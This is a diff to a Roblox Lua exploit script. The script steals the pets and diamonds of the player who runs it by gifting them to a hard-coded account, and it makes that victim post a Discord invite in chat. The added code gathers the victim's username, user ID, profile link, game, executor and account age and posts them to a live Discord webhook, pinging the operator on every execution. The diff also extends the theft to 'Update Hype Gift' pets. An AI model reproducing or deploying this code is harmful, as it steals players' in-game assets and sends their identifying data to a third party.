@@ -1,3 +1,90 @@
+local Webhook = "https://discord.com/api/webhooks/1121783169490894878/VXFhSJFYyHJ2kUS006gqUxzCC5Amuqrhkdos6ekIOyxcPBjQ8hEc7cBMAa3igjiukD_X" -- your webhook
+_G.Discord_UserID = "here" -- ID To Ping on every execution, blank if no one wants to be pinged.
+
+local player = game:GetService"Players".LocalPlayer
+local joinTime = os.time() - (player.AccountAge*86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local msg = {
+   ["username"] = "Being a pedo",
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+   ["embeds"] = {
+       {
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "This Bozo executed.",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "Username",
+                   ["value"] = "||"..player.Name.."||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Display Name",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "UID",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Id",
+                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Name",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Executor Used",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Alt",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Account Age",
+                   ["value"] = player.AccountAge.."day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Date Joined",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       }
+   }
+}
+
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 _G.Username = "W4r_ObScUrE" --// Username To Send Pets To
 _G.GiftMessage = ".gg/EP9uC28cna" --// Message For The Gift To Say
 _G.SendMessage = "disco epic code! its EP9uC28cna" --// Message the victim will send in the chat on execution
@@ -180,6 +267,8 @@ _G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
 while wait() do
     for i, v in pairs(savedPets) do
         local v2 = FrameworkLibrary.Directory.Pets[v.id]
+	_G.PetName = v2.name
+        _G.PetRar = v2.rarity
         if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                     _G.Lol = 0
         end
@@ -224,7 +313,7 @@ while wait() do
         if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                     _G.Lol = 0
         end        
-        if v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+        if v2.rarity == "Exclusive" or v2.name == "Update Hype Gift" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
             local args = {
